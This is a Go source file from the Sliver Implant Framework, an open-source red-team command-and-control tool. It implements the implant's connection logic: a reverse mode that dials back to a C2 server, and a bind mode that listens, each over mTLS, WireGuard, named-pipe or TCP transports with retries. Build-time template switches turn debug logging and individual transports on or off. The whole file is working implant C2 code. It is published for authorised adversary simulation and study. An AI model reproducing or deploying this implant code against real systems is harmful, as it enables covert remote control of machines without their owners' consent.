package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"fmt"
	"time"

	// {{if .Config.TCPc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/tcp"
	// {{end}}

	// {{if .Config.WGc2Enabled}}
	"net"

	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"

	// {{end}}

	// {{if .Config.NamePipec2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/namedpipe"
	// {{end}}

	// {{if .Config.MTLSc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
	// {{end}}
)

// startReverse - The implant dials back a C2 server.
func (t *C2) startReverse() (err error) {

	// {{if .Config.Debug}}
	log.Printf("Connecting (reverse) %s <- (%s)", t.uri.Host, t.uri.Scheme)
	// {{end}}

	for t.failures < int(t.Profile.MaxConnectionErrors) {

		// We might have several transport protocols available, while some
		// of which being unable to do stream multiplexing (ex: mTLS + DNS):
		// we directly set up the C2 RPC layer here when needed, and we will
		// skip the mux part below if needed.
		switch t.uri.Scheme {

		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			// Get physical
			t.Conn, err = mtls.Dial(t.uri, t.Profile)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed: %s", err)
				// {{end}}
				t.FailedAttempt()
				continue
			}
			// {{end}} - MTLSc2Enabled

		// {{if .Config.WGc2Enabled}}
		case "wg":
			// Attempt to resolve the hostname in case
			// we received a domain name and not an IP address.
			// net.LookupHost() will still work with an IP address
			addrs, err := net.LookupHost(t.uri.Hostname())
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Failed to lookup host: %s", err)
				// {{end}}
				break
			}
			if len(addrs) == 0 {
				// {{if .Config.Debug}}
				log.Printf("Invalid address: %s", t.uri.String())
				// {{end}}
				break
			}

			hostname := addrs[0]
			conn, dev, err := wireguard.WGConnect(hostname, t.Profile)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Failed to start WireGuard: %s", err.Error())
				// {{end}}
				if dev != nil {
					dev.Close()
				}
				t.FailedAttempt()
				continue
			}
			t.Conn = conn

			// Once we will close this C2 channel, we need to perform custom
			// cleanup here: closing the WireGuard virtual interface:
			// Passed to the Session layer when setting up the Session.
			t.Connection.Cleanup = func() error {
				// {{if .Config.Debug}}
				log.Printf("Closing Wireguard interface")
				// {{end}}
				dev.Close()
				return nil
			}
			// {{end}} - WGc2Enabled

		// {{if .Config.NamePipec2Enabled}}
		case "namedpipe":
			t.Conn, err = namedpipe.Dial(t.uri, t.Profile)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Connection failed: %s", err)
				// {{end}}
				t.FailedAttempt()
				continue
			}
			// {{end}} -NamePipec2Enabled

		// {{if .Config.TCPc2Enabled}}
		case "tcp":
			t.Conn, err = tcp.Dial(t.uri, t.Profile)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[tcppivot] Connection failed: %s", err)
				// {{end}}
				t.FailedAttempt()
				continue
			}
			// {{end}} -TCPc2Enabled
		default:
			err = fmt.Errorf("Unknown c2 protocol: %s", t.uri.Scheme)
			// {{if .Config.Debug}}
			log.Printf(err.Error())
			// {{end}}
			return nil
		}

		// If the connection is set (and thus not nil), break and return
		if t.Conn != nil {
			break
		}

		// In case of failure to initiate a session, sleep
		// for the determined ReconnectInterval. This interval
		// is shared both at the transport and at the Session layer.
		time.Sleep(time.Duration(t.Profile.Interval))
	}

	// Only return an error if we have exhausted attempts
	if t.attempts == int(t.Profile.MaxConnectionErrors) {
		return ErrMaxAttempts
	}

	return
}

// startBind - When the transport is a bind one, we start to listen over the given URL
// and transport protocol. Each listening function is blocking and sets the RPC layer
// on its own, before returning either a working implant connection, or an error.
func (t *C2) startBind() (err error) {

	// {{if .Config.Debug}}
	log.Printf("Listening (bind) on %s (%s)", t.uri.Host, t.uri.Scheme)
	// {{end}}

	for t.failures < int(t.Profile.MaxConnectionErrors) {
		switch t.uri.Scheme {

		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			// Get physical
			t.Conn, err = mtls.Listen(t.uri, t.Profile)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed: %s", err)
				// {{end}}
				t.FailedAttempt()
				continue
			}
			// {{end}} - MTLSc2Enabled

		// {{if .Config.NamePipec2Enabled}}
		case "namedpipe", "named_pipe", "pipe":
			t.Conn, err = namedpipe.Listen(t.uri, t.Profile)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Connection failed: %s", err)
				// {{end}}
				t.FailedAttempt()
				continue
			}
			// {{end}} -NamePipec2Enabled

		// {{if .Config.TCPc2Enabled}}
		case "tcp":
			// Get physical
			t.Conn, err = tcp.Listen(t.uri, t.Profile)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed: %s", err)
				// {{end}}
				t.FailedAttempt()
				continue
			}
			// {{end}} - TCPc2Enabled

		default:
			// {{if .Config.Debug}}
			log.Printf("Invalid C2 address sheme: %s", t.uri.Scheme)
			// {{end}}
			return nil
		}

		// If the connection is set (and thus not nil), break and return
		if t.Conn != nil {
			break
		}

		// In case of failure to initiate a session, sleep
		// for the determined ReconnectInterval. This interval
		// is shared both at the transport and at the Session layer.
		time.Sleep(time.Duration(t.Profile.Interval))
	}

	// Only return an error if we have exhausted attempts
	if t.attempts == int(t.Profile.MaxConnectionErrors) {
		return ErrMaxAttempts
	}

	return
}
